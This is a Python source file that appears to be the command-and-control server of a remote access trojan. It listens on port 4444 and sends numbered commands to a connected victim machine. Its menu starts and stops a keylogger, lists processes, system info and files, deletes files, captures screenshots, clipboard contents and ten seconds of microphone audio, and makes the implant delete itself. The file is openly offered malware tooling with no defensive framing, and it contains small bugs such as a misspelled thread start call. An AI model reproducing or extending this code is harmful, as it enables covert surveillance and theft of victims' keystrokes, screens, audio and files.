import socket
from threading import *
from datetime import datetime

port = 4444

endConn = "2"
keyLog = "3"
endKeyLog = "4"
procEnum = "5"
sysInfo = "6"
fileDir = "7"
fileDel = "8"
sShot = "9"
clipBoard = "10"
recAudio = "11"

def connect():
    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("192.168.0.4", 4444))
    sock.listen(1)
    print("Waiting...")
    connThread = Thread(target=waitConn)
    connThread.start()

def waitConn():
    global client
    try:
        client, addr = sock.accept()
        print("Connection: ", addr[0], addr[1])
        print('-'*100 + "\n")
    except OSError:
        print('-'*100 + "\n")
        print("Connection closed")

def closeConn():
    if 'client' in globals():
        client.send(endConn.encode())
    sock.close()

def printKey():
    while True:
        data = client.recv(1024)
        if not stopKeyLogFlag:
            if data:
                print(data.decode())
        else:
            break

def printText():
    while True:
        data = client.recv(1024)
        if not data:
            break
        print(data.decode().encode('cp1251').decode('cp866'))

def file(photo):
    file = open(photo, "wb")
    fileData = client.recv(1024)
    while fileData:
        file.write(fileData)
        fileData = client.recv(2048)
    file.close()
    """bytesCount = int(fileData.decode())
    client.send(str(bytesCount).encode())
    while bytesCount:
        del fileData
        fileData = client.recv(1024)
        file.write(fileData)
        bytesCount -= 1024
        if bytesCount <= 0:
            break
    file.close()
    print("Downloaded file\n")"""

def keyLogStart():
    print("Keylogger start:\n")
    client.send(keyLog.encode())
    global stopKeyLogFlag
    stopKeyLogFlag = 0
    keyLogThreads = Thread(target=printKey)
    keyLogThreads.start()

def keyLogStop():
    print("Keylogger stop:\n")
    global stopKeyLogFlag
    client.send(endKeyLog.encode())
    stopKeyLogFlag = 1

def procEnumeration():
    print("Processes:\n")
    client.send(procEnum.encode())
    procEnumThread = Thread(target=printText)
    procEnumThread.strt()

def delMyself():
    print("Delete myself:\n")
    client.send(fileDel.encode())


def systemInfo():
    print("System info:\n")
    client.send(sysInfo.encode())
    sysInfoThred = Thread(target=printText)
    sysInfoThred.start()

def dirFile():
    print("Files:\n")
    client.send(fileDir.encode())
    fileDirThread = Thread(target=printText)
    fileDirThread.start()

def fileDelete():
    file2Del = input("Name of file to del: ")
    if file2Del == "":
        print("Dont have name\n")
    else:
        client.send(fileDel.encode())
        client.send(file2Del.encode())

def screenShot():
    print("Screen of monitor:\n")
    today = datetime.now()
    client.send(sShot.encode())
    file("Screen.png")

def clipboard():
    print("Buffer:\n")
    client.send(clipBoard.encode())
    clipThread = Thread(target=printText)
    clipThread.start()

def recordAudio():
    print("Audio record 10 sec:\n")
    client.send(recAudio.encode())
    today = datetime.now()
    audioFile = str(today.strftime('%Y-%m-%d-%H:%M:%S')) + ".wav"
    recAudioThread = Thread(target=file, args=(audioFile, ))
    recAudioThread.start()

if __name__=='__main__':
    opt = ""
    while (opt != "12"):
        opt = input ("1-wait, 2-close, 3-keylogStart, 4-keyLogEnd, 5-1057, 6-sysInfo, 7-dirFile, 8-delFile, 9-screenshot, 10-clipboard, 11-audio, 12-exit")
        if opt == "1":
            connect()
        if opt == "2":
            closeConn()
        if opt == "3":
            keyLogStart()
        if opt == "4":
            keyLogStop()
        if opt == "5":
            procEnumeration()
        if opt == "6":
            systemInfo()
        if opt == "7":
            dirFile()
        if opt == "8":
            fileDelete()
        if opt == "9":
            screenShot()
        if opt == "10":
            clipboard()
        if opt == "11":
            recordAudio()
        if opt == "13":
            delMyself()
        if opt not in ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13"]:
            print("Command doesnt exist\n")


























